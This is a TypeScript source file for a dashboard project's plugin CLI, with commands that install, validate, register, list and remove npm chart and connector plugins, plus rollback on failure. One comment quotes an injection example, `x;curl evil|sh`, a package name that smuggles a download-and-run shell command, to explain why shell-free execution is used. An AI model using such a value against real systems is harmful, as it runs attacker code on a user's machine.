import {
  existsSync,
  readFileSync,
  readdirSync,
  rmSync,
  writeFileSync,
} from "node:fs";
import { join } from "node:path";
import { findProjectRoot, assertCheckout } from "../lib/config.js";
import { run, runFile } from "../lib/exec.js";
import {
  success,
  info,
  error as logError,
  warn,
  createSpinner,
} from "../lib/output.js";
import {
  readManifest,
  addToManifest,
  removeFromManifest,
  type ManifestEntry,
} from "../lib/manifest.js";
import { validatePluginExport } from "../lib/plugin-validator.js";
import {
  hintForValidatorError,
  hintForMissingExport,
} from "../lib/plugin-validator-hints.js";

const PLUGINS_MANIFEST = "neoboard-plugins.json";
const CONNECTORS_MANIFEST = "neoboard-connectors.json";

const KINDS = {
  chart: {
    file: PLUGINS_MANIFEST,
    key: "plugins",
    codegen: "scripts/generate-plugin-imports.mjs",
  },
  connector: {
    file: CONNECTORS_MANIFEST,
    key: "connectors",
    codegen: "scripts/generate-connector-imports.mjs",
  },
} as const;

// Every file `plugin add` can change, so a failed add puts each back byte for
// byte (#2065).
const TOUCHED_FILES = [
  "package.json",
  "package-lock.json",
  PLUGINS_MANIFEST,
  CONNECTORS_MANIFEST,
];
type Snapshot = Record<string, string | null>;

/**
 * Install an npm package, validate it as a NeoBoard plugin, and register it.
 */
export async function runPluginAdd(
  spec: string,
  opts?: { override?: boolean; export?: string },
): Promise<void> {
  assertCheckout("plugin");
  const root = findProjectRoot() as string;
  const overrides = opts?.override ?? false;
  const exportName = opts?.export ?? "default";
  const before = snapshot(root);

  // 1. Install the package. runFile (no shell) passes the spec as a single
  // argv element, so a name copy-pasted from a README like `x;curl evil|sh`
  // can't inject — while still supporting scoped names, versions, and
  // file:/git specs that a validation allowlist would reject. (#HIGH)
  const spinner = createSpinner("Installing " + spec + "...");
  spinner.start();
  try {
    runFile("npm", ["install", spec], { cwd: root });
    spinner.succeed("Installed " + spec);
  } catch (err) {
    spinner.fail("Failed to install " + spec);
    logError(String(err));
    process.exitCode = 1;
    return;
  }

  // 2. A spec can be a version, a path or a git URL: import and register the
  // name npm installed it under (#2065).
  const packageName = installedName(
    spec,
    before["package.json"],
    readOrNull(join(root, "package.json")),
  );
  if (!packageName) {
    logError("Could not tell which package npm installed for " + spec + ".");
    rollback(root, before);
    return;
  }

  const plugin = await loadPlugin(packageName, exportName);
  if (!plugin) {
    rollback(root, before, packageName);
    return;
  }

  // 3. Register in the appropriate manifest
  const kind = KINDS[plugin.pluginType];
  const entry = {
    package: packageName,
    ...(exportName !== "default" ? { export: exportName } : {}),
    ...(overrides ? { overrides: true } : {}),
  };
  if (!addToManifest(join(root, kind.file), kind.key, entry)) {
    warn(
      packageName + " is already registered in " + kind.file + ". Skipping.",
    );
  }

  // 4. Run codegen. An entry it rejects fails every later build (#2065).
  try {
    run("node " + kind.codegen, { cwd: root });
  } catch (err) {
    logError("Codegen failed for " + packageName + ": " + String(err));
    rollback(root, before, packageName);
    return;
  }

  success(
    'Plugin "' +
      String(plugin.exported.type) +
      '" registered as ' +
      plugin.pluginType +
      " in " +
      kind.file,
  );
}

/**
 * List all registered plugins: the built-in chart types, the connection
 * package's connectors, and the external ones from the manifests.
 */
export async function runPluginList(): Promise<void> {
  assertCheckout("plugin");
  const root = findProjectRoot() as string;

  // Keep in sync with app/src/plugins/chart-types.ts
  const builtInCharts = [
    "bar",
    "line",
    "pie",
    "table",
    "single-value",
    "graph",
    "map",
    "json",
    "parameter-select",
    "form",
    "markdown",
    "iframe",
    "gauge",
    "sankey",
    "sunburst",
    "radar",
    "gantt",
    "choropleth",
  ];

  await printPlugins(
    "Charts",
    builtInCharts,
    readManifest(join(root, PLUGINS_MANIFEST), "plugins"),
  );
  console.log("");
  await printPlugins(
    "Connectors",
    builtInConnectorTypes(root),
    readManifest(join(root, CONNECTORS_MANIFEST), "connectors"),
  );
}

/**
 * Remove an external plugin by package name and uninstall it.
 */
export async function runPluginRemove(packageName: string): Promise<void> {
  assertCheckout("plugin");
  const root = findProjectRoot() as string;

  // Try both manifests
  let removed = removeFromManifest(
    join(root, PLUGINS_MANIFEST),
    "plugins",
    packageName,
  );
  let manifestType: "chart" | "connector" = "chart";

  if (!removed) {
    removed = removeFromManifest(
      join(root, CONNECTORS_MANIFEST),
      "connectors",
      packageName,
    );
    manifestType = "connector";
  }

  if (!removed) {
    logError(
      'Package "' +
        packageName +
        '" is not registered as an external plugin. Cannot remove built-in plugins.',
    );
    process.exitCode = 1;
    return;
  }

  // Run codegen
  const codegenScript = KINDS[manifestType].codegen;

  try {
    run("node " + codegenScript, { cwd: root });
  } catch {
    warn("Codegen script failed. Run manually: node " + codegenScript);
  }

  // Uninstall the package
  try {
    runFile("npm", ["uninstall", packageName], { cwd: root });
  } catch {
    warn("npm uninstall failed. Run manually: npm uninstall " + packageName);
  }

  success('Plugin "' + packageName + '" removed');
}

async function loadExport(name: string, exportName: string) {
  const mod = (await import(name)) as Record<string, unknown>;
  const exported =
    exportName === "default" ? (mod.default ?? mod) : mod[exportName];
  return { mod, exported };
}

/** The validated plugin, or undefined after saying why it is not one. */
async function loadPlugin(name: string, exportName: string) {
  let loaded: Awaited<ReturnType<typeof loadExport>>;
  try {
    loaded = await loadExport(name, exportName);
  } catch (err) {
    logError("Failed to import " + name + ": " + String(err));
    return undefined;
  }

  if (!loaded.exported) {
    logError(
      'Package "' +
        name +
        '" has no ' +
        (exportName === "default" ? "default" : '"' + exportName + '"') +
        " export.",
    );
    const exportHint = hintForMissingExport(
      exportName,
      Object.keys(loaded.mod),
    );
    if (exportHint) info("  " + exportHint);
    return undefined;
  }

  const validation = validatePluginExport(loaded.exported);
  if (!validation.valid) {
    logError('Package "' + name + '" is not a valid NeoBoard plugin:');
    for (const e of validation.errors) {
      logError("  - " + e);
      const hint = hintForValidatorError(e);
      if (hint) info("    → " + hint);
    }
    return undefined;
  }

  return {
    exported: loaded.exported as Record<string, unknown>,
    pluginType: validation.pluginType!,
  };
}

async function printPlugins(
  title: string,
  builtIns: string[],
  external: ManifestEntry[],
): Promise<void> {
  info(
    title +
      " (" +
      builtIns.length +
      " built-in, " +
      external.length +
      " external):",
  );
  for (const type of builtIns) {
    console.log("  " + type.padEnd(20) + "built-in");
  }
  for (const ext of external) {
    const type = await pluginTypeOf(ext);
    console.log(
      "  " +
        type.padEnd(20) +
        "external  " +
        ext.package +
        (ext.overrides ? "  (overrides)" : ""),
    );
  }
}

// A package that cannot be imported still lists, by package name (#2065).
async function pluginTypeOf(entry: ManifestEntry): Promise<string> {
  try {
    const { exported } = await loadExport(
      entry.package,
      entry.export ?? "default",
    );
    const type = (exported as { type?: unknown } | undefined)?.type;
    return typeof type === "string" ? type : "?";
  } catch {
    return "?";
  }
}

// ponytail: plain Node cannot import the connector registry yet (#1697), so
// read each connector's own descriptor, as .claude/hooks/check-boundaries.sh
// does. Switch to getAllConnectors() once it can.
function builtInConnectorTypes(root: string): string[] {
  const src = join(root, "connection", "src");
  return readdirSync(src)
    .sort()
    .flatMap((dir) => {
      const descriptor = readOrNull(join(src, dir, "descriptor.ts")) ?? "";
      const match = /^ {2}type: "([^"]+)"/m.exec(descriptor);
      return match ? [match[1]] : [];
    });
}

function readOrNull(path: string): string | null {
  return existsSync(path) ? readFileSync(path, "utf8") : null;
}

function snapshot(root: string): Snapshot {
  return Object.fromEntries(
    TOUCHED_FILES.map((file) => [file, readOrNull(join(root, file))]),
  );
}

function dependencies(packageJson: string | null): Record<string, string> {
  const pkg = JSON.parse(packageJson ?? "{}") as Record<
    string,
    Record<string, string> | undefined
  >;
  return {
    ...pkg.optionalDependencies,
    ...pkg.devDependencies,
    ...pkg.dependencies,
  };
}

/** The dependency `npm install <spec>` added or changed in package.json. */
function installedName(
  spec: string,
  before: string | null,
  after: string | null,
): string | undefined {
  const was = dependencies(before);
  const now = dependencies(after);
  const changed = Object.keys(now).find((name) => now[name] !== was[name]);
  // npm leaves package.json alone when the spec names a package it already has.
  return changed ?? (Object.hasOwn(now, spec) ? spec : undefined);
}

// #2065: uninstall only a package this add introduced, then restore every file
// it touched.
// ponytail: a spec that upgraded a dependency the checkout already had leaves
// the new version in node_modules until the next `npm install`.
function rollback(root: string, before: Snapshot, packageName?: string): void {
  warn("Rolling back " + (packageName ?? "the install"));
  const wasDependency =
    packageName === undefined ||
    Object.hasOwn(dependencies(before["package.json"]), packageName);
  if (!wasDependency) {
    try {
      runFile("npm", ["uninstall", packageName], { cwd: root });
    } catch {
      // best effort
    }
  }
  for (const [file, content] of Object.entries(before)) {
    const path = join(root, file);
    if (readOrNull(path) === content) continue;
    if (content === null) rmSync(path, { force: true });
    else writeFileSync(path, content);
  }
  process.exitCode = 1;
}
